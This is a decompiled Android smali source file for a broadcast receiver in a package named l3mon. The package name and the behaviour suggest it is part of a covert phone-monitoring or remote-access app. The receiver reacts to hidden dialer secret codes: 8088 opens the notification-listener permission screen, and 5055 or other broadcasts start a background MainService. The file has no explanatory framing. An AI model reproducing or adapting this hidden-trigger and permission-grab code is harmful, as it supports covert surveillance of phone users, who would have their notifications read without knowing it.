.class public Lcom/etechd/l3mon/MyReceiver;
.super Landroid/content/BroadcastReceiver;
.source "MyReceiver.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 10
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 15
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Landroid/content/Intent;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 18
    move-object v0, p0

    move-object/from16 v1, p1

    move-object/from16 v2, p2

    move-object v7, v2

    invoke-virtual {v7}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v7

    const-string v8, "android.provider.Telephony.SECRET_CODE"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_0

    .line 19
    move-object v7, v2

    invoke-virtual {v7}, Landroid/content/Intent;->getDataString()Ljava/lang/String;

    move-result-object v7

    move-object v4, v7

    .line 20
    move-object v7, v4

    const-string v8, "://"

    invoke-virtual {v7, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    move-object v5, v7

    .line 21
    move-object v7, v5

    const/4 v8, 0x1

    aget-object v7, v7, v8

    const-string v8, "8088"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_1

    .line 22
    move-object v7, v1

    new-instance v8, Landroid/content/Intent;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    const-string v10, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

    invoke-direct {v9, v10}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v8}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 29
    :cond_0
    :goto_0
    new-instance v7, Landroid/content/Intent;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    move-object v9, v1

    :try_start_0
    const-string v10, "com.etechd.l3mon.MainService"

    invoke-static {v10}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v10

    invoke-direct {v8, v9, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v2, v7

    .line 30
    move-object v7, v1

    move-object v8, v2

    invoke-virtual {v7, v8}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v7

    return-void

    .line 23
    :cond_1
    move-object v7, v5

    const/4 v8, 0x1

    aget-object v7, v7, v8

    const-string v8, "5055"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_0

    goto :goto_0

    .line 29
    :catch_0
    move-exception v7

    move-object v4, v7

    new-instance v7, Ljava/lang/NoClassDefFoundError;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    move-object v9, v4

    invoke-virtual {v9}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v7
.end method
